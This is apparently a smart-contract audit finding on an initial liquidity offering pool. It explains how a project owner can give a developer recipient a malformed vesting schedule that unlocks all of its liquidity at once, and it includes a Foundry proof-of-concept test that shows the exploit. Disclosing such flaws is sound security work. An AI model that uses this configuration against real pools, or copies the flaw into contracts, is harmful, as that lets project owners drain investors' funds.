# Vulnerability details

## Impact
Let's assume that project commit that they launch 100% token on ILO, so users is safe since no one could have token to dump the price including project itself.
Project admin could set vesting schedule for other recipients at any time. which could leads to project can withdraw all liquidity after launch without any vest. With that amount of tokens, project can use sale token to withdraw all raise token left in the pool.

## Proof of Concept
create new file `POC.t.sol` in folder `test` then paste this code and run `forge test --mt testPOC`

// SPDX-License-Identifier: MIT 

pragma solidity =0.7.6;
pragma abicoder v2;
import "./IntegrationTestBase.sol";


contract ILOPOCTest is IntegrationTestBase {
    address iloPool;
    function setUp() external {
        _setupBase();
        iloPool = _initPool(PROJECT_OWNER, _getMalliciousInitPoolParams());
    }

    function testPOC() external {
        // buy
        vm.prank(PROJECT_OWNER);
        IILOWhitelist(iloPool).batchWhitelist(_getListAddressFromAddress(INVESTOR));

        vm.prank(INVESTOR);
        IERC20(USDC).approve(iloPool, 1000000000 ether);
        
        _writeTokenBalance(USDC, INVESTOR, 1000000000 ether);

        uint256 balanceBefore = IERC20(USDC).balanceOf(iloPool);
        
        vm.warp(SALE_START+1);
        vm.prank(INVESTOR);
        (uint256 tokenId,) = IILOPool(iloPool).buy(0.1 ether, INVESTOR);
        

        (uint128 _liquidity,,,) = IILOPool(iloPool).positions(tokenId);
        assertEq(uint256(_liquidity), 40000000000000000);

        // launch
        _writeTokenBalance(SALE_TOKEN, iloPool, 1000000 ether);
        vm.warp(LAUNCH_START + 1); // 1 sec after vesting start
        vm.prank(address(iloManager)); // 1 sec after vesting start
        IILOPool(iloPool).launch();

        /**
         * 20% to investor with linear vesting worth 40000000000000000 liquidity
         * 20% to dev would also be worth 40000000000000000 liquidity
         */

        vm.warp(VEST_START_0 + 1); // 1 sec after vesting start
        (uint256 unlockedLiquidity,) = IILOVest(iloPool).vestingStatus(
            IERC721Enumerable(iloPool).tokenOfOwnerByIndex(DEV_RECIPIENT, 0)
        );
        
        assertEq(unlockedLiquidity, 40000000000000000); // DEV_RECIPIENT should not have this unlocked. this is 100% unlocked for dev

    }

    function _getMalliciousInitPoolParams() internal returns(IILOManager.InitPoolParams memory) {
        return IILOManager.InitPoolParams({
            uniV3Pool: projectId,
            tickLower: MIN_TICK_500,
            tickUpper: -MIN_TICK_500,
            hardCap: 100000 ether,
            softCap: 0 ether,
            maxCapPerUser: 60000 ether,
            start: SALE_START,
            end: SALE_END,
            vestingConfigs: _malliciousVestingConfigs()
        });
    }

    function _malliciousVestingConfigs() internal pure returns (IILOVest.VestingConfig[] memory vestingConfigs) {
        vestingConfigs = new IILOVest.VestingConfig[](4);
        vestingConfigs[0] = IILOVest.VestingConfig({
                    shares: 2000, // 20%
                    recipient: address(0),
                    schedule: _getLinearVesting()
            });
        vestingConfigs[1] = IILOVest.VestingConfig({
                    shares: 3000, // 30%
                    recipient: TREASURY_RECIPIENT,
                    schedule: _getLinearVesting()
            });
        vestingConfigs[2] = IILOVest.VestingConfig({
                    shares: 2000, // 20%
                    recipient: DEV_RECIPIENT,
                    schedule: _malliciousVestingSchedule()
            });
        vestingConfigs[3] = IILOVest.VestingConfig({
                    shares: 3000, // 30%
                    recipient: LIQUIDITY_RECIPIENT,
                    schedule: _getLinearVesting()
            });
    }

    function _malliciousVestingSchedule() internal pure returns (IILOVest.LinearVest[] memory linearVestConfigs) {
        linearVestConfigs = new IILOVest.LinearVest[](2);
        linearVestConfigs[0] = IILOVest.LinearVest({
                    shares: 3000, // 30% 
                    start: VEST_START_0,
                    end: 0 // this is the malicious part
            });
        linearVestConfigs[1] = IILOVest.LinearVest({
                    shares: 7000, // 70% 
                    start: 0, // this is the malicious part
                    end: 1 // this is the malicious part
            });
    }

    function _getListAddressFromAddress(address addr) internal pure returns (address[] memory addresses) {
        addresses = new address[](1);
        addresses[0] = addr;
    }
}
